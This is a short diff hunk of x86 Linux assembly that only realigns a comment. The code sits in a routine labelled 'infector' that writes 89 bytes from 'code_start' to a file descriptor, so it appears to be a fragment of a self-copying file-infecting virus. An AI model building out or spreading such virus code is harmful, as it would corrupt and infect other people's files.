@@ -83,7 +83,7 @@ infector:
 
     mov     eax, 4          ; Write   
     mov     ebx, esi        ; fd
-    mov     ecx, code_start        ; buffer.
+    mov     ecx, code_start ; buffer.
     mov     edx, 89         ; Maximal length.
     int     0x80            ; Transfer control to operating system
 
